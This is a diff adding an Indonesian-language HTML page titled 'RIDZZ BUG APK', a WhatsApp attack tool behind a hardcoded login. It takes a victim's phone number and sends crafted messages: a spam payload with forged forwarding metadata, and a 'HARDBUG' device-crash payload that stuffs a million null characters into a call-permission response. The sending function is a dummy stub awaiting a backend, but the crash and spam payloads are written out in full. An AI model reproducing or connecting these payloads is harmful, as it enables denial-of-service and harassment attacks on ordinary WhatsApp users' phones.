@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RIDZZ BUG APK</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: url('https://img1.pixhost.to/images/7134/620903555_vinzx.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 300px;
+            width: 100%;
+        }
+        input, select, button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
+            font-size: 16px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="loginForm">
+    <h1>Login RIDZZ BUG</h1>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="login()">Masuk</button>
+</div>
+
+<div class="container" id="mainForm" style="display: none;">
+    <h1>RIDZZ BUG</h1>
+    <input type="text" id="nomor" placeholder="Masukkan Nomor WhatsApp">
+    <select id="pilihan">
+        <option value="DELAY">DELAY</option>
+        <option value="INVIS">INVIS</option>
+        <option value="HARDBUG">HARDBUG</option>
+    </select>
+    <button onclick="kirim()">Kirim</button>
+</div>
+
+<script>
+    function login() {
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+        if (user === "ridzz" && pass === "ridzz") {
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('mainForm').style.display = 'block';
+        } else {
+            alert("Username atau password salah!");
+        }
+    }
+
+    // Contoh rikz dummy untuk simulasi
+    const rikz = {
+        relayMessage: async (target, message, options) => {
+            console.log("Relaying message to:", target);
+            console.log(message);
+            console.log(options);
+            alert(`Simulasi kirim bug ke: ${target}\nSilakan hubungkan ke backend sesuai kebutuhan.`);
+        }
+    };
+
+    async function VampSpam(langgxyz, target) {
+        try {
+            let message = {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2,
+                        },
+                        interactiveMessage: {
+                            contextInfo: {
+                                mentionedJid: [target],
+                                isForwarded: true,
+                                forwardingScore: 999,
+                                businessMessageForwardInfo: {
+                                    businessOwnerJid: target,
+                                },
+                            },
+                            body: {
+                                text: "Ridzzx 🐍 🐍 Here",
+                            },
+                            nativeFlowMessage: {
+                                buttons: Array(6).fill({ name: "mpm", buttonParamsJson: "" }),
+                            },
+                        },
+                    },
+                },
+            };
+            await rikz.relayMessage(target, message, { participant: { jid: target } });
+        } catch (err) {
+            console.log(err);
+        }
+    }
+
+    async function VampDeviceCrash(langgxyz, target) {
+        await rikz.relayMessage(target, {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "Hi...I'm Ridzzx Crash 🐍",
+                            format: "DEFAULT"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "call_permission_request",
+                            paramsJson: "\u0000".repeat(1000000),
+                            version: 3
+                        }
+                    }
+                }
+            }
+        }, { participant: { jid: target }});
+    }
+
+    function kirim() {
+        const nomor = document.getElementById('nomor').value;
+        const pilihan = document.getElementById('pilihan').value;
+
+        if (!nomor) {
+            alert("Harap masukkan nomor terlebih dahulu.");
+            return;
+        }
+
+        if (pilihan === "DELAY" || pilihan === "INVIS") {
+            VampSpam(null, nomor);
+        } else if (pilihan === "HARDBUG") {
+            VampDeviceCrash(null, nomor);
+        }
+    }
+</script>
+
+</body>
+</html>
